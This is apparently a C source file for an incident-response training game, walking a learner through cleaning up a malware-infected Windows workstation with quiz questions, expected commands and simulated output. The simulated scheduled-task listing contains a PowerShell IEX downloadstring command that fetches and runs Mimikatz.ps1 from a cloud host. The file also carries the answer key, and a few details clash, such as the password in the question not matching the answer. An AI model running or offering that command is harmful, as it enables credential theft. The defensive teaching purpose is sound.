#include <stdio.h>
#include "scenario.h"


struct Playbook s1Steps[] = {
        {
            .stepNo = 1,
            .question = "Beginning the response, connect to the infected machine as an admin via RDP using the IP address and default port.\n",
            .answer = "mstsc /v:192.168.50.100 /admin",
            .terminalOut = "Connecting to CORP\\WST1 as an admin...\nConnected!\n"
        },
        {
            .stepNo = 2,
            .question = "Identify the running processes in the infected machine.\n",
            .answer = "tasklist /fi \"status eq running\"",
            .terminalOut = "Running Processes:\n"
            "====================================================\n"
            "| Image Name          | PID     | Mem Usage        |\n"
            "====================================================\n"
            "| explorer.exe        | 11600   | 257,520 K        |\n"
            "| msedge.exe          | 6556    | 310,000 K        |\n"
            "| explorerr.exe       | 4496    | 769,334 K        |\n"
            "====================================================\n"
        },
        {
            .stepNo = 3,
            .question = "Analyze the list of running processes, identify which is malicious, and kill it with its PID.\n",
            .answer = "taskkill /pid 4496",
            .terminalOut = "Process explorerr.exe:4496 successfully killed.\n"
        },
        {
            .stepNo = 4,
            .question = "Knowing the method of persistence employed by the threat actor, list the configured scheduled tasks in the system in verbose mode.\n",
            .answer = "schtasks /query /v",
            .terminalOut = "Scheduled Tasks:\n"
                "==================================================================================================\n"
                "| Task Name      | Author     | Trigger              | Task to Run                               |\n"
                "==================================================================================================\n"
                "| npcapwatchdog  | UncleSocks | At system startup    | C:\\Program Files\\Npcap\\CheckStatus.bat    |\n"
                "| MSUpdate       | UncleSocks | At logon of any      | C:\\Windows\\System32\\powershell.exe IEX    |\n"
                "|                                                      ((new-object netwebclient).downloadstring |\n"
                "|                                                      (https://ec2.aws.com/Mimikatz.ps1         |\n"
                "| MSEdgeUpdate   |            | At 1:30 PM every day | C:\\Program Files (x86)\\Microsoft\\Edge     |\n"
                "|                                                      Update\\MicrosoftEdgeUpdate.exe \\c         |\n"
                "==================================================================================================\n"
        },
        {
            .stepNo = 5,
            .question = "Identify and delete the scheduled task used for persistence.\n",
            .answer = "schtasks /delete /tn MSUpdate",
            .terminalOut = "Scheduled task 'MSUpdate' successfully deleted.\n"
        },
        {
            .stepNo = 6,
            .question = "Enumerate the contents of the Temp directory of user 'wapols.'\nNote: Make sure to add the trailing '\\' character.\n",
            .answer = "dir C:\\Users\\wapols\\AppData\\Local\\Temp\\",
            .terminalOut = "Directory of C:\\Users\\wapols\\AppData\\Local\\Temp\n"
                "=================================================================\n"
                "| Date Modified       | Type     | Size        | Name           |\n"
                "=================================================================\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | .              |\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | ..             |\n"
                "| 03/06/2025 3:15 PM  |          | 128,382     | 170D-0ds3.tmp  |\n"
                "| 03/09/2025 3:18 AM  |          | 137,901     | 200T-992f.tmp  |\n"
                "| 10/15/2025 10:15 PM |          | 894,100,211 | 436Pds.dll     |\n"
                "| 05/16/2025 9:08 AM  |          | 98,910      | cdstmp_1041.gz |\n"
                "| 05/16/2025 9:12 AM  |          | 100,485     | clsctt_2041.gz |\n"
                "| 09/30/2025 8:15 AM  | <DIR>    |             | lfuwih.sdr     |\n"
                "=================================================================\n"
        },
        {
            .stepNo = 7,
            .question = "Identify and delete the malicious binary in the user's Temp folder.\n",
            .answer = "del C:\\Users\\wapols\\AppData\\Local\\Temp\\436Pds.dll",
            .terminalOut = "File '436Pds.dll' successfully deleted.\n"
        },
        {
            .stepNo = 8,
            .question = "Identify and confirm the directory where the threat actor is staging the data to be exfiltrated.\n",
            .answer = "dir C:\\Temp\\",
            .terminalOut = "Directory of C:\\Users\\wapols\\AppData\\Local\\Temp\n"
                "=================================================================\n"
                "| Date Modified       | Type     | Size        | Name           |\n"
                "=================================================================\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | .              |\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | ..             |\n"
                "| 10/15/2025 11:09 PM |          | 91,732      | hashedCred.txt |\n"
                "| 10/15/2025 11:11 PM |          | 33,180,221  | lsass.dmp      |\n"
                "=================================================================\n"
        },
        {
            .stepNo = 9,
            .question = "Delete the 'Temp' directory with the exfiltrated files.\n",
            .answer = "rmdir C:\\Temp\\ /s",
            .terminalOut = "Directory 'C:\\Temp' successfully deleted.\n"
        }, 
        {
            .stepNo = 10,
            .question = "To further remediate the risk of re-compromise, reset the password of the affected user to 't3mpp@ss'\n",
            .answer = "net user wapols T3mpP@ss",
            .terminalOut = "Password for user 'wapols' has been changed.\n"
        }

};


struct Incident s1 = {
    .title = "\n\nCASE-IR-1: UNKNOWN MALWARE INFECTION ON A WORKSTATION\n",
    .background =         
        "Meeps Security has identified that endpoint CORP\\WST1 (192.168.50.100) has been compromised by a malware.\n"
        "According to the client's Cyber Threat Intelligence group, the malware is known to spoof well-known Microsoft\n"
        "processes. It was also observed that the threat actor behind the attack uses scheduled tasks to maintain per-\n"
        "sistence.\n\n"
        "OSINT research also showed that organizations that have been compromised by the same threat actor reported\n"
        "a suspicious 'Temp' folder located in the root drive, where the exfiltrated data is being staged. Furthermore,\n"
        "an adisory from CISA confirms that the threat actor utilizes EC2 instances for command & control (C2).\n\n"
        "As one of the incident responders, follow the response playbook to remediate the risk.\n",
    .steps = s1Steps,
    .stepCount = sizeof(s1Steps) / sizeof(s1Steps[0])
};